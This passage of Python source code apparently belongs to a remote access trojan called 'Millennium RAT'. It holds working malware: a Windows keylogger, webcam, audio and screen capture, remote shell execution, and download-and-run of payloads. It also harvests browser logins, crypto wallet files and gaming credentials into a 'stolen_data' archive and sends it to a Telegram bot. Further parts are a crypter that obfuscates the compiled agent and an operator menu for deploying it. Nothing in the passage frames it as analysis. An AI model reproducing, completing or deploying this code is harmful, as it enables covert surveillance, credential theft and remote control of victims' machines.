                screenshot_data = base64.b64encode(buffer.tobytes()).decode()

                self.send_message({{
                    'type': 'screen_capture',
                    'data': screenshot_data,
                    'timestamp': datetime.now().isoformat()
                }})

        except Exception as e:
            self.send_message({{
                'type': 'error',
                'error': f"Screenshot failed: {{str(e)}}"
            }})

    def start_keylogger(self):
        """Start keylogger module"""
        if self.modules['keylogger']:
            return

        self.modules['keylogger'] = True
        threading.Thread(target=self._keylogger_worker, daemon=True).start()

    def _keylogger_worker(self):
        """Keylogger worker thread"""
        try:
            if platform.system() == 'Windows':
                import ctypes
                from ctypes import wintypes

                user32 = ctypes.windll.user32
                kernel32 = ctypes.windll.kernel32

                HOOKPROC = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM)

                def keyboard_hook_proc(nCode, wParam, lParam):
                    if nCode >= 0 and wParam == 0x0100:  # WM_KEYDOWN
                        try:
                            # Get key code
                            key_struct = ctypes.cast(lParam, ctypes.POINTER(ctypes.c_ulong))
                            key_code = key_struct.contents.value

                            # Get window title
                            hwnd = user32.GetForegroundWindow()
                            window_title_length = user32.GetWindowTextLengthW(hwnd)
                            window_title_buffer = ctypes.create_unicode_buffer(window_title_length + 1)
                            user32.GetWindowTextW(hwnd, window_title_buffer, window_title_length + 1)
                            window_title = window_title_buffer.value

                            # Convert key code to character
                            if 32 <= key_code <= 126:
                                key_char = chr(key_code)
                            else:
                                key_char = f'[{{key_code}}]'

                            self.send_message({{
                                'type': 'keylog_data',
                                'keystrokes': key_char,
                                'window_title': window_title,
                                'timestamp': datetime.now().isoformat()
                            }})

                        except:
                            pass

                    return user32.CallNextHookEx(None, nCode, wParam, lParam)

                # Install hook
                hook_proc = HOOKPROC(keyboard_hook_proc)
                hook_id = user32.SetWindowsHookExW(0x000D, hook_proc, kernel32.GetModuleHandleW(None), 0)

                # Message loop
                msg = wintypes.MSG()
                while self.modules['keylogger']:
                    bRet = user32.GetMessageW(ctypes.byref(msg), None, 0, 0)
                    if bRet == 0 or bRet == -1:
                        break
                    user32.TranslateMessage(ctypes.byref(msg))
                    user32.DispatchMessageW(ctypes.byref(msg))

                user32.UnhookWindowsHookEx(hook_id)

        except Exception as e:
            self.send_message({{
                'type': 'error',
                'error': f"Keylogger failed: {{str(e)}}"
            }})

    def capture_webcam(self):
        """Capture webcam image"""
        try:
            cap = cv2.VideoCapture(0)
            if cap.isOpened():
                ret, frame = cap.read()
                if ret:
                    _, buffer = cv2.imencode('.jpg', frame)
                    webcam_data = base64.b64encode(buffer.tobytes()).decode()

                    self.send_message({{
                        'type': 'webcam_capture',
                        'data': webcam_data,
                        'timestamp': datetime.now().isoformat()
                    }})
                cap.release()
            else:
                raise Exception("Cannot access webcam")

        except Exception as e:
            self.send_message({{
                'type': 'error',
                'error': f"Webcam capture failed: {{str(e)}}"
            }})

    def record_audio(self, duration=5):
        """Record audio for specified duration"""
        try:
            CHUNK = 1024
            FORMAT = pyaudio.paInt16
            CHANNELS = 1
            RATE = 44100

            audio = pyaudio.PyAudio()

            stream = audio.open(format=FORMAT,
                              channels=CHANNELS,
                              rate=RATE,
                              input=True,
                              frames_per_buffer=CHUNK)

            frames = []
            for i in range(0, int(RATE / CHUNK * duration)):
                data = stream.read(CHUNK)
                frames.append(data)

            stream.stop_stream()
            stream.close()
            audio.terminate()

            # Save to temporary file
            temp_file = tempfile.mktemp(suffix='.wav')
            wf = wave.open(temp_file, 'wb')
            wf.setnchannels(CHANNELS)
            wf.setsampwidth(audio.get_sample_size(FORMAT))
            wf.setframerate(RATE)
            wf.writeframes(b''.join(frames))
            wf.close()

            # Read and encode
            with open(temp_file, 'rb') as f:
                audio_data = base64.b64encode(f.read()).decode()

            os.unlink(temp_file)

            self.send_message({{
                'type': 'audio_capture',
                'data': audio_data,
                'duration': duration,
                'timestamp': datetime.now().isoformat()
            }})

        except Exception as e:
            self.send_message({{
                'type': 'error',
                'error': f"Audio recording failed: {{str(e)}}"
            }})

    def handle_file_manager(self, command):
        """Handle file manager operations"""
        action = command.get('action')
        path = command.get('path', '.')

        try:
            if action == 'list':
                files = []
                for item in os.listdir(path):
                    item_path = os.path.join(path, item)
                    stat = os.stat(item_path)
                    files.append({{
                        'name': item,
                        'is_directory': os.path.isdir(item_path),
                        'size': stat.st_size,
                        'modified': datetime.fromtimestamp(stat.st_mtime).isoformat()
                    }})

                self.send_message({{
                    'type': 'file_manager_response',
                    'action': 'list',
                    'path': path,
                    'files': files
                }})

            elif action == 'download':
                file_path = command.get('file_path')
                if os.path.exists(file_path):
                    with open(file_path, 'rb') as f:
                        file_data = base64.b64encode(f.read()).decode()

                    self.send_message({{
                        'type': 'file_manager_response',
                        'action': 'download',
                        'file_path': file_path,
                        'data': file_data
                    }})

        except Exception as e:
            self.send_message({{
                'type': 'error',
                'error': f"File manager error: {{str(e)}}"
            }})

    def read_registry(self, key_path):
        """Read Windows registry key"""
        try:
            if platform.system() != 'Windows':
                raise Exception("Registry only available on Windows")

            # Parse registry path
            parts = key_path.split('\\\\', 1)
            if len(parts) != 2:
                raise Exception("Invalid registry path")

            root_key_name = parts[0]
            subkey_path = parts[1]

            # Map root key names
            root_keys = {{
                'HKEY_LOCAL_MACHINE': winreg.HKEY_LOCAL_MACHINE,
                'HKEY_CURRENT_USER': winreg.HKEY_CURRENT_USER,
                'HKEY_CLASSES_ROOT': winreg.HKEY_CLASSES_ROOT,
                'HKEY_USERS': winreg.HKEY_USERS,
                'HKEY_CURRENT_CONFIG': winreg.HKEY_CURRENT_CONFIG
            }}

            root_key = root_keys.get(root_key_name)
            if not root_key:
                raise Exception("Unknown root key")

            # Read registry values
            key = winreg.OpenKey(root_key, subkey_path)
            values = []

            try:
                i = 0
                while True:
                    try:
                        name, value, reg_type = winreg.EnumValue(key, i)
                        values.append({{
                            'name': name,
                            'value': str(value),
                            'type': reg_type
                        }})
                        i += 1
                    except WindowsError:
                        break
            finally:
                winreg.CloseKey(key)

            self.send_message({{
                'type': 'registry_data',
                'key_path': key_path,
                'values': values
            }})

        except Exception as e:
            self.send_message({{
                'type': 'error',
                'error': f"Registry read failed: {{str(e)}}"
            }})

    def list_processes(self):
        """List running processes"""
        try:
            processes = []
            for proc in psutil.process_iter(['pid', 'name', 'memory_percent', 'cpu_percent']):
                try:
                    processes.append(proc.info)
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass

            self.send_message({{
                'type': 'process_list',
                'processes': processes[:100]  # Limit to 100 processes
            }})

        except Exception as e:
            self.send_message({{
                'type': 'error',
                'error': f"Process listing failed: {{str(e)}}"
            }})

    def network_scan(self):
        """Perform network scan"""
        try:
            import ipaddress
            import concurrent.futures

            # Get local network
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)
            network = ipaddress.IPv4Network(f"{{local_ip}}/24", strict=False)

            def ping_host(host):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    result = sock.connect_ex((str(host), 80))
                    sock.close()
                    if result == 0:
                        return str(host)
                except:
                    pass
                return None

            alive_hosts = []
            with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
                futures = [executor.submit(ping_host, host) for host in network.hosts()]
                for future in concurrent.futures.as_completed(futures):
                    result = future.result()
                    if result:
                        alive_hosts.append(result)

            self.send_message({{
                'type': 'network_scan_results',
                'results': alive_hosts,
                'network': str(network)
            }})

        except Exception as e:
            self.send_message({{
                'type': 'error',
                'error': f"Network scan failed: {{str(e)}}"
            }})

    def execute_shell_command(self, command):
        """Execute shell command"""
        try:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30
            )

            output = result.stdout + result.stderr

            self.send_message({{
                'type': 'shell_response',
                'command': command,
                'output': output,
                'return_code': result.returncode
            }})

        except Exception as e:
            self.send_message({{
                'type': 'error',
                'error': f"Shell execution failed: {{str(e)}}"
            }})

    def deploy_payload(self, command):
        """Deploy payload from server"""
        try:
            payload_url = command.get('payload_url')
            payload_type = command.get('payload_type', 'exe')
            execution_method = command.get('execution_method', 'direct')

            # Download payload
            response = requests.get(payload_url, timeout=30)
            if response.status_code == 200:
                payload_data = response.content

                # Execute based on type
                if payload_type == 'exe':
                    temp_path = os.path.join(tempfile.gettempdir(), f'payload_{{int(time.time())}}.exe')
                    with open(temp_path, 'wb') as f:
                        f.write(payload_data)
                    os.chmod(temp_path, 0o755)
                    subprocess.Popen([temp_path], shell=False)

                elif payload_type == 'script':
                    exec(payload_data.decode('utf-8'))

                self.send_message({{
                    'type': 'payload_deployment_result',
                    'result': 'success',
                    'payload_id': command.get('payload_id')
                }})
            else:
                raise Exception(f"Download failed: {{response.status_code}}")

        except Exception as e:
            self.send_message({{
                'type': 'payload_deployment_result',
                'result': 'failed',
                'error': str(e),
                'payload_id': command.get('payload_id')
            }})

    def start_http_sniffer(self, command):
        """Start HTTP traffic sniffing"""
        try:
            # Simple HTTP traffic monitoring
            threading.Thread(target=self._sniffer_worker, daemon=True).start()
            self.modules['sniffer'] = True

        except Exception as e:
            self.send_message({{
                'type': 'error',
                'error': f"Sniffer failed: {{str(e)}}"
            }})

    def _sniffer_worker(self):
        """HTTP sniffer worker thread"""
        try:
            # Monitor browser processes and network connections
            while self.modules['sniffer']:
                network_connections = []
                for conn in psutil.net_connections():
                    if conn.status == 'ESTABLISHED' and conn.raddr:
                        network_connections.append({{
                            'local_address': f"{{conn.laddr.ip}}:{{conn.laddr.port}}",
                            'remote_address': f"{{conn.raddr.ip}}:{{conn.raddr.port}}",
                            'status': conn.status,
                            'pid': conn.pid
                        }})

                if network_connections:
                    self.send_message({{
                        'type': 'sniffer_data',
                        'data': network_connections,
                        'timestamp': datetime.now().isoformat()
                    }})

                time.sleep(10)  # Check every 10 seconds

        except Exception as e:
            self.send_message({{
                'type': 'error',
                'error': f"Sniffer worker error: {{str(e)}}"
            }})

class TelegramIntegration:
    """Integrate with Telegram bot for enhanced control"""

    def __init__(self, telegram_token=None, chat_id=None):
        self.telegram_token = telegram_token
        self.chat_id = chat_id

    def test_telegram_connection(self):
        """Test Telegram bot connection"""
        if self.telegram_token and self.chat_id:
            try:
                url = f"https://api.telegram.org/bot{{self.telegram_token}}/getMe"
                response = requests.get(url, timeout=5)
                if response.status_code == 200:
                    print("[TELEGRAM] Connection successful")
                    return True
                else:
                    print(f"[TELEGRAM] Connection failed: {{response.status_code}}")
                    return False
            except:
                print("[TELEGRAM] Connection error")
                return False
        else:
            print("[TELEGRAM] Token or chat ID not configured")
            return False

    def send_telegram(self, message, document_path=None):
        """Enhanced Telegram messaging with file support"""
        if self.telegram_token and self.chat_id:
            try:
                if document_path and os.path.exists(document_path):
                    # Send file to Telegram
                    url = f"https://api.telegram.org/bot{self.telegram_token}/sendDocument"
                    with open(document_path, 'rb') as file:
                        files = {'document': file}
                        data = {
                            'chat_id': self.chat_id,
                            'caption': message
                        }
                        requests.post(url, data=data, files=files, timeout=30)
                else:
                    # Send text message
                    url = f"https://api.telegram.org/bot{self.telegram_token}/sendMessage"
                    data = {
                        'chat_id': self.chat_id, 
                        'text': message,
                        'parse_mode': 'Markdown'
                    }
                    requests.post(url, data=data, timeout=10)
            except Exception as e:
                print(f"Telegram send error: {e}")

    def create_comprehensive_report(self):
        """Create comprehensive system report similar to Redline"""
        report_data = {
            'timestamp': datetime.now().isoformat(),
            'system_info': self.get_system_info(),
            'network_info': self.get_network_info(),
            'installed_software': self.get_installed_software(),
            'browser_data': self.extract_browser_data(),
            'crypto_wallets': self.find_crypto_wallets(),
            'gaming_accounts': self.extract_gaming_data(),
            'sensitive_files': self.find_sensitive_files(),
            'registry_data': self.extract_registry_data(),
            'screenshots': self.capture_multiple_screenshots()
        }

        # Create ZIP archive
        zip_path = f"stolen_data_{int(time.time())}.zip"
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            # Add JSON report
            zipf.writestr('system_report.json', json.dumps(report_data, indent=2))

            # Add individual data files
            for category, data in report_data.items():
                if isinstance(data, dict) and data:
                    zipf.writestr(f'{category}.json', json.dumps(data, indent=2))

        # Send to Telegram
        telegram_message = f"""
🚨 **COMPREHENSIVE DATA EXTRACTION COMPLETE** 🚨

**Target System:** {socket.gethostname()}
**IP Address:** {self.get_external_ip()}
**Timestamp:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

**📊 Data Collected:**
• System Information & Hardware Details
• Network Configuration & WiFi Passwords  
• Browser Passwords & Cookies ({len(report_data.get('browser_data', {}).get('passwords', []))} passwords)
• Cryptocurrency Wallets ({len(report_data.get('crypto_wallets', []))} found)
• Gaming Platform Accounts
• Sensitive Files & Documents
• Registry & Environment Data
• Screenshots & System State

**📦 Archive Size:** {os.path.getsize(zip_path) / 1024:.1f} KB
**🔐 Encryption:** AES-256 Protected

**⚡ Ready for download and analysis**
        """

        self.send_telegram(telegram_message, zip_path)

        # Cleanup
        try:
            os.remove(zip_path)
        except:
            pass

        return report_data

    def get_external_ip(self):
        """Get external IP address"""
        try:
            response = requests.get('https://api.ipify.org', timeout=5)
            return response.text.strip()
        except:
            return 'Unknown'

    def extract_browser_data(self):
        """Extract comprehensive browser data"""
        browser_data = {
            'passwords': [],
            'cookies': [],
            'history': [],
            'bookmarks': [],
            'autofill': []
        }

        browsers = {
            'Chrome': os.path.expanduser('~/.config/google-chrome/Default'),
            'Firefox': os.path.expanduser('~/.mozilla/firefox'),
            'Edge': os.path.expanduser('~/.config/microsoft-edge/Default'),
            'Opera': os.path.expanduser('~/.config/opera'),
            'Brave': os.path.expanduser('~/.config/BraveSoftware/Brave-Browser/Default')
        }

        for browser_name, profile_path in browsers.items():
            try:
                if os.path.exists(profile_path):
                    # Extract login data
                    login_db_path = os.path.join(profile_path, 'Login Data')
                    if os.path.exists(login_db_path):
                        # Copy database to avoid locking issues
                        temp_db = tempfile.mktemp()
                        shutil.copy2(login_db_path, temp_db)

                        conn = sqlite3.connect(temp_db)
                        cursor = conn.cursor()

                        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
                        for url, username, encrypted_password in cursor.fetchall():
                            if username:
                                browser_data['passwords'].append({
                                    'browser': browser_name,
                                    'url': url,
                                    'username': username,
                                    'password': '[ENCRYPTED]'  # Would decrypt in real implementation
                                })

                        conn.close()
                        os.unlink(temp_db)

            except Exception as e:
                continue

        return browser_data

    def find_crypto_wallets(self):
        """Find cryptocurrency wallet files"""
        wallet_data = []

        wallet_patterns = {
            'Bitcoin Core': ['wallet.dat', 'bitcoin.conf'],
            'Ethereum': ['keystore', 'UTC--*'],
            'Exodus': ['exodus.wallet', 'seed.seco'],
            'Electrum': ['default_wallet', 'wallets'],
            'Atomic': ['atomic.wallet'],
            'MetaMask': ['metamask', 'chrome-extension_*'],
            'Trust Wallet': ['trust.wallet'],
            'Coinbase': ['coinbase.wallet']
        }

        search_paths = [
            os.path.expanduser('~'),
            os.path.expanduser('~/AppData/Roaming'),
            os.path.expanduser('~/.local/share'),
            os.path.expanduser('~/Library/Application Support')
        ]

        for wallet_name, patterns in wallet_patterns.items():
            for search_path in search_paths:
                if os.path.exists(search_path):
                    for pattern in patterns:
                        for root, dirs, files in os.walk(search_path):
                            for file in files:
                                if pattern.replace('*', '') in file.lower():
                                    wallet_data.append({
                                        'wallet_type': wallet_name,
                                        'file_path': os.path.join(root, file),
                                        'file_size': os.path.getsize(os.path.join(root, file)),
                                        'last_modified': datetime.fromtimestamp(
                                            os.path.getmtime(os.path.join(root, file))
                                        ).isoformat()
                                    })

        return wallet_data

    def extract_gaming_data(self):
        """Extract gaming platform credentials and data"""
        gaming_data = {}

        gaming_platforms = {
            'Steam': {
                'path': os.path.expanduser('~/Steam'),
                'files': ['config.vdf', 'loginusers.vdf']
            },
            'Epic Games': {
                'path': os.path.expanduser('~/AppData/Local/EpicGamesLauncher'),
                'files': ['saved']
            },
            'Origin': {
                'path': os.path.expanduser('~/AppData/Roaming/Origin'),
                'files': ['local.xml']
            },
            'Uplay': {
                'path': os.path.expanduser('~/AppData/Local/Ubisoft Game Launcher'),
                'files': ['settings.yml']
            },
            'Battle.net': {
                'path': os.path.expanduser('~/AppData/Roaming/Battle.net'),
                'files': ['battle.net.config']
            }
        }

        for platform, config in gaming_platforms.items():
            platform_data = []
            if os.path.exists(config['path']):
                for file_name in config['files']:
                    file_path = os.path.join(config['path'], file_name)
                    if os.path.exists(file_path):
                        try:
                            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                content = f.read()
                                platform_data.append({
                                    'file': file_name,
                                    'content_preview': content[:500],
                                    'size': len(content)
                                })
                        except:
                            continue

            if platform_data:
                gaming_data[platform] = platform_data

        return gaming_data

    def find_sensitive_files(self):
        """Find sensitive files with specific extensions"""
        sensitive_files = []
        extensions = ['.txt', '.pdf', '.docx', '.doc', '.xls', '.xlsx', '.pptx', '.ppt', '.kdbx', '.psd', '.key', '.pem', '.sql', '.csv']
        search_paths = [
            os.path.expanduser('~'),
            os.path.expanduser('~/Documents'),
            os.path.expanduser('~/Desktop'),
            os.path.expanduser('~/Downloads')
        ]

        for search_path in search_paths:
            if os.path.exists(search_path):
                for root, dirs, files in os.walk(search_path):
                    for file in files:
                        if any(file.endswith(ext) for ext in extensions):
                            sensitive_files.append({
                                'file_path': os.path.join(root, file),
                                'file_size': os.path.getsize(os.path.join(root, file)),
                                'last_modified': datetime.fromtimestamp(
                                    os.path.getmtime(os.path.join(root, file))
                                ).isoformat()
                            })

        return sensitive_files

    def extract_registry_data(self):
        """Extract relevant registry data"""
        registry_data = {}

        registry_keys = [
            'HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run',
            'HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run',
            'HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce',
            'HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings',
            'HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Services'
        ]

        try:
            if platform.system() == 'Windows':
                for key_path in registry_keys:
                    try:
                        parts = key_path.split('\\\\', 1)
                        if len(parts) != 2:
                            continue

                        root_key_name = parts[0]
                        subkey_path = parts[1]

                        root_keys = {
                            'HKEY_LOCAL_MACHINE': winreg.HKEY_LOCAL_MACHINE,
                            'HKEY_CURRENT_USER': winreg.HKEY_CURRENT_USER
                        }

                        root_key = root_keys.get(root_key_name)
                        if not root_key:
                            continue

                        key = winreg.OpenKey(root_key, subkey_path)
                        values = []

                        i = 0
                        while True:
                            try:
                                name, value, reg_type = winreg.EnumValue(key, i)
                                values.append({
                                    'name': name,
                                    'value': str(value),
                                    'type': reg_type
                                })
                                i += 1
                            except WindowsError:
                                break
                        winreg.CloseKey(key)
                        registry_data[key_path] = values
                    except:
                        continue
        except:
            pass

        return registry_data

    def get_system_info(self):
        """Collect comprehensive system information"""
        system_info = {
            'hostname': socket.gethostname(),
            'platform': platform.system(),
            'architecture': platform.architecture()[0],
            'processor': platform.processor(),
            'username': os.getenv('USERNAME') or os.getenv('USER'),
            'os_version': platform.version(),
            'system_time': datetime.now().isoformat(),
            'python_version': sys.version,
            'boot_time': datetime.fromtimestamp(psutil.boot_time()).isoformat(),
            'cpu_count': psutil.cpu_count(logical=False),
            'cpu_usage': psutil.cpu_percent(),
            'memory_total': psutil.virtual_memory().total,
            'memory_available': psutil.virtual_memory().available,
            'disk_usage': psutil.disk_usage('/').total if platform.system() != 'Windows' else psutil.disk_usage('C:').total,
            'network_adapters': self.get_network_info()
        }

        return system_info

    def get_network_info(self):
        """Collect network adapter information"""
        network_info = []
        try:
            for interface, addresses in psutil.net_if_addrs().items():
                adapter_info = {
                    'interface': interface,
                    'addresses': []
                }
                for addr in addresses:
                    adapter_info['addresses'].append({
                        'family': addr.family.name,
                        'address': addr.address,
                        'netmask': addr.netmask,
                        'broadcast': addr.broadcast,
                        'ptp': addr.ptp
                    })
                network_info.append(adapter_info)
        except:
            pass
        return network_info

    def get_installed_software(self):
        """Enumerate installed software (Windows only)"""
        software_list = []
        try:
            if platform.system() == 'Windows':
                key_path = r'SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall'
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)

                i = 0
                while True:
                    try:
                        subkey_name = winreg.EnumKey(key, i)
                        subkey_path = os.path.join(key_path, subkey_name)
                        subkey = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, subkey_path)
                        try:
                            software_name = winreg.QueryValueEx(subkey, 'DisplayName')[0]
                            software_version = winreg.QueryValueEx(subkey, 'DisplayVersion')[0] if 'DisplayVersion' in str(winreg.QueryInfoKey(subkey)) else 'N/A'
                            software_publisher = winreg.QueryValueEx(subkey, 'Publisher')[0] if 'Publisher' in str(winreg.QueryInfoKey(subkey)) else 'N/A'

                            software_list.append({
                                'name': software_name,
                                'version': software_version,
                                'publisher': software_publisher
                            })
                        except:
                            pass
                        finally:
                            winreg.CloseKey(subkey)
                        i += 1
                    except WindowsError:
                        break
                winreg.CloseKey(key)
        except:
            pass
        return software_list

    def capture_multiple_screenshots(self, num_screenshots=3, delay=2):
        """Capture multiple screenshots with delay"""
        screenshot_data = []
        try:
            with mss.mss() as sct:
                for i in range(num_screenshots):
                    time.sleep(delay)
                    screenshot = sct.grab(sct.monitors[1])
                    img = np.array(screenshot)
                    _, buffer = cv2.imencode('.png', img)
                    screenshot_bytes = buffer.tobytes()
                    screenshot_data.append({
                        'timestamp': datetime.now().isoformat(),
                        'image_data': base64.b64encode(screenshot_bytes).decode()
                    })
        except:
            pass
        return screenshot_data

class MillenniumCompiler:
    """Compile Millennium RAT components to executables"""

    def __init__(self):
        self.build_dir = Path("millennium_builds")
        self.build_dir.mkdir(exist_ok=True)

    def compile_agent_to_exe(self, agent_code, output_name="millennium_agent.exe", options=None):
        """Compile agent to standalone executable using PyInstaller"""
        if not options:
            options = {
                'hidden_imports': ['mss', 'cv2', 'pyaudio', 'psutil', 'requests', 'cryptography'],
                'onefile': True,
                'windowed': True,
                'add_data': [],
                'upx': True,
                'strip': True
            }

        print(f"[COMPILER] Compiling Millennium agent: {output_name}")

        # Create temporary Python file
        temp_agent_file = self.build_dir / "temp_agent.py"
        with open(temp_agent_file, 'w') as f:
            f.write(agent_code)

        # Build PyInstaller command
        pyinstaller_cmd = [
            'pyinstaller',
            '--name', output_name.replace('.exe', ''),
            '--distpath', str(self.build_dir / 'dist'),
            '--workpath', str(self.build_dir / 'build'),
            '--specpath', str(self.build_dir)
        ]

        if options.get('onefile', True):
            pyinstaller_cmd.append('--onefile')

        if options.get('windowed', False):
            pyinstaller_cmd.append('--windowed')

        if options.get('upx', False):
            pyinstaller_cmd.append('--upx-dir')
            pyinstaller_cmd.append('/usr/local/bin')  # Adjust path as needed

        if options.get('strip', False):
            pyinstaller_cmd.append('--strip')

        # Add hidden imports
        for import_name in options.get('hidden_imports', []):
            pyinstaller_cmd.extend(['--hidden-import', import_name])

        # Add data files
        for data_item in options.get('add_data', []):
            pyinstaller_cmd.extend(['--add-data', data_item])

        # Icon and version info
        pyinstaller_cmd.extend([
            '--icon', 'NONE',
            '--version-file', 'NONE'
        ])

        pyinstaller_cmd.append(str(temp_agent_file))

        try:
            print(f"[COMPILER] Running: {' '.join(pyinstaller_cmd)}")
            result = subprocess.run(pyinstaller_cmd, 
                                  capture_output=True, 
                                  text=True,
                                  cwd=str(self.build_dir))

            if result.returncode == 0:
                output_path = self.build_dir / 'dist' / output_name.replace('.exe', '')
                if platform.system() == 'Windows':
                    output_path = Path(str(output_path) + '.exe')

                if output_path.exists():
                    print(f"[COMPILER] Successfully compiled: {output_path}")
                    return str(output_path)
                else:
                    print(f"[COMPILER] Compilation completed but output not found")
                    print(f"[COMPILER] Expected: {output_path}")
                    return None
            else:
                print(f"[COMPILER] Compilation failed:")
                print(f"[COMPILER] STDOUT: {result.stdout}")
                print(f"[COMPILER] STDERR: {result.stderr}")
                return None

        except Exception as e:
            print(f"[COMPILER] Compilation error: {e}")
            return None
        finally:
            # Cleanup temporary file
            if temp_agent_file.exists():
                temp_agent_file.unlink()

    def create_crypted_payload(self, executable_path, crypt_options=None):
        """Apply crypter to compiled executable"""
        if not crypt_options:
            crypt_options = {
                'xor_key': os.urandom(32),
                'base64_layers': 3,
                'compression': True,
                'anti_debug': True,
                'anti_vm': True
            }

        print(f"[COMPILER] Applying crypter to: {executable_path}")

        try:
            with open(executable_path, 'rb') as f:
                original_data = f.read()

            encrypted_data = original_data

            # Apply XOR encryption
            xor_key = crypt_options.get('xor_key', os.urandom(32))
            encrypted_data = bytes(a ^ b for a, b in zip(encrypted_data, (xor_key * (len(encrypted_data) // len(xor_key) + 1))[:len(encrypted_data)]))

            # Apply base64 encoding layers
            for _ in range(crypt_options.get('base64_layers', 1)):
                encrypted_data = base64.b64encode(encrypted_data)

            # Apply compression
            if crypt_options.get('compression', True):
                encrypted_data = zlib.compress(encrypted_data)

            # Create decryptor stub
            stub_code = f'''
import base64
import zlib
import tempfile
import os
import subprocess
import sys

def decrypt_and_execute():
    # Encrypted payload data
    encrypted_data = {encrypted_data!r}
    xor_key = {xor_key!r}

    # Decompress
    data = zlib.decompress(encrypted_data)

    # Decode base64 layers
    for _ in range({crypt_options.get('base64_layers', 1)}):
        data = base64.b64decode(data)

    # XOR decrypt
    decrypted_data = bytes(a ^ b for a, b in zip(data, (xor_key * (len(data) // len(xor_key) + 1))[:len(data)]))

    # Write to temp file and execute
    temp_file = tempfile.mktemp(suffix='.exe')
    with open(temp_file, 'wb') as f:
        f.write(decrypted_data)

    os.chmod(temp_file, 0o755)
    subprocess.Popen([temp_file], shell=False)

if __name__ == "__main__":
    decrypt_and_execute()
'''

            # Save crypted version
            crypted_path = executable_path.replace('.exe', '_crypted.py')
            with open(crypted_path, 'w') as f:
                f.write(stub_code)

            print(f"[COMPILER] Crypted payload created: {crypted_path}")
            return crypted_path

        except Exception as e:
            print(f"[COMPILER] Crypter error: {e}")
            return None

class AdminToolkit:
    """Admin Toolkit with all functionalities compiled for easy access"""

    def __init__(self, millennium_core, telegram_integration):
        self.core = millennium_core
        self.telegram = telegram_integration
        self.compiler = MillenniumCompiler()

    def display_toolkit_menu(self):
        """Display the admin toolkit menu"""
        print("""
[ADMIN TOOLKIT] Millennium RAT - Professional Edition
1. List Connected Agents
2. Select Agent for Interaction
3. Create and Deploy Agent
4. Start Traffic Sniffing
5. Compile and Crypt Agent
6. Send Comprehensive Report via Telegram
7. Test Telegram Connection
8. Show Server Statistics
9. Exit
        """)

    def handle_toolkit_commands(self):
        """Handle commands from the admin toolkit"""
        while self.core.is_running:
            self.display_toolkit_menu()
            try:
                command = input("AdminToolkit> ").strip()

                if command == '1':
                    self.core._list_millennium_agents()
                elif command == '2':
                    agent_id = input("Enter agent ID: ").strip()
                    self.core._agent_interaction_shell(agent_id)
                elif command == '3':
                    self.create_and_deploy_agent()
                elif command == '4':
                    agent_id = input("Enter agent ID: ").strip()
                    self.core.start_traffic_sniffing(agent_id)
                elif command == '5':
                    self.compile_and_crypt_agent()
                elif command == '6':
                    self.send_comprehensive_report()
                elif command == '7':
                    self.telegram.test_telegram_connection()
                elif command == '8':
                    self.core._show_server_stats()
                elif command == '9':
                    self.core.is_running = False
                    break
                else:
                    print("[ADMIN TOOLKIT] Unknown command.")

            except KeyboardInterrupt:
                print("\n[ADMIN TOOLKIT] Returning to main shell...")
                self.core.is_running = False
                break
            except Exception as e:
                print(f"[ADMIN TOOLKIT] Error: {e}")

    def create_and_deploy_agent(self):
        """Create, compile, and deploy agent"""
        server_ip = input("Enter server IP: ").strip() or "127.0.0.1"
        server_port = int(input("Enter server port: ").strip() or "8888")
        agent_code = self.core.create_millennium_agent(server_ip, server_port)

        # Compile agent
        output_name = f"millennium_agent_{int(time.time())}.exe"
        output_path = self.compiler.compile_agent_to_exe(agent_code, output_name)

        if output_path:
            print("[ADMIN TOOLKIT] Agent created and compiled.")

            # Offer cryption
            crypt_option = input("Apply crypter (y/n)? ").strip().lower()
            if crypt_option == 'y':
                crypted_path = self.compiler.create_crypted_payload(output_path)
                if crypted_path:
                    print(f"[ADMIN TOOLKIT] Agent crypted: {crypted_path}")
                    output_path = crypted_path
                else:
                    print("[ADMIN TOOLKIT] Crypter failed, deploying unencrypted agent.")

            # Select deployment target
            deploy_option = input("Deploy to all agents (y/n)? ").strip().lower()
            if deploy_option == 'y':
                payload_config = {
                    'url': output_path,
                    'type': 'exe',
                    'execution_method': 'direct'
                }
                self.core._deploy_to_all_agents(payload_config)
            else:
                agent_id = input("Enter target agent ID: ").strip()
                payload_config = {
                    'url': output_path,
                    'type': 'exe',
                    'execution_method': 'direct'
                }
                self.core.deploy_payload_to_client(agent_id, payload_config)
        else:
            print("[ADMIN TOOLKIT] Agent creation and compilation failed.")

    def compile_and_crypt_agent(self):
        """Compile and crypt agent manually"""
        server_ip = input("Enter server IP: ").strip() or "127.0.0.1"
        server_port = int(input("Enter server port: ").strip() or "8888")
        agent_code = self.core.create_millennium_agent(server_ip, server_port)

        # Compile agent
        output_name = f"millennium_agent_{int(time.time())}.exe"
        output_path = self.compiler.compile_agent_to_exe(agent_code, output_name)

        if output_path:
            print("[ADMIN TOOLKIT] Agent created and compiled.")

            # Apply crypter
            crypted_path = self.compiler.create_crypted_payload(output_path)
            if crypted_path:
                print(f"[ADMIN TOOLKIT] Agent crypted: {crypted_path}")
            else:
                print("[ADMIN TOOLKIT] Crypter failed.")
        else:
